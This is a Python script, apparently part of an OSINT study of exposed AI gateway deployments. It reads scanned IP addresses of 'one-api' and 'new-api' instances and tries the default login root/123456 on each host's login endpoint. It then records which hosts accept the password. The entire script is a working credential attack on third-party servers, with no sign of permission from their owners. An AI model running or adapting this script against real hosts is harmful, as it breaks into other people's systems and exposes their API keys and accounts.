#!/usr/bin/env python3
import json, requests, sys, time
requests.packages.urllib3.disable_warnings()

with open('/home/cowboy/AI-LLM-Infrastructure-OSINT/data/cat32-findings.json') as f:
    findings = json.load(f)

one_api_ips = [f for f in findings if f['platform'] == 'one-api'][:20]
new_api_ips  = [f for f in findings if f['platform'] == 'new-api'][:20]

results = {'one-api': [], 'new-api': []}

def probe(ip, port=3000):
    url = f"http://{ip}:{port}/api/user/login"
    try:
        r = requests.post(url,
            json={"username": "root", "password": "123456"},
            timeout=5, verify=False,
            headers={'Content-Type': 'application/json'})
        body = r.text[:200]
        success = '"success":true' in body or '"success": true' in body
        return {'ip': ip, 'status': r.status_code, 'success': success, 'snippet': body[:120]}
    except Exception as e:
        return {'ip': ip, 'error': str(e)[:60]}

print("## one-api default cred probe (root/123456)")
for f in one_api_ips:
    r = probe(f['ip'])
    results['one-api'].append(r)
    icon = '✓ DEFAULT CREDS ACTIVE' if r.get('success') else ('✗ refused' if r.get('status') else '⏱ timeout')
    print(f"  {f['ip']:>16}  {icon}")
    time.sleep(0.5)

print("\n## new-api default cred probe (root/123456)")
for f in new_api_ips:
    r = probe(f['ip'])
    results['new-api'].append(r)
    icon = '✓ DEFAULT CREDS ACTIVE' if r.get('success') else ('✗ refused' if r.get('status') else '⏱ timeout')
    print(f"  {f['ip']:>16}  {icon}")
    time.sleep(0.5)

for platform, res in results.items():
    confirmed = sum(1 for r in res if r.get('success'))
    refused   = sum(1 for r in res if r.get('status') and not r.get('success'))
    timeout   = sum(1 for r in res if r.get('error'))
    print(f"\n{platform}: {confirmed}/{len(res)} default creds active | {refused} refused | {timeout} timeout")

out = '/home/cowboy/AI-LLM-Infrastructure-OSINT/data/cat32-defaultcred-probe.json'
with open(out, 'w') as f:
    json.dump(results, f, indent=2)
print(f"\nSaved -> {out}")
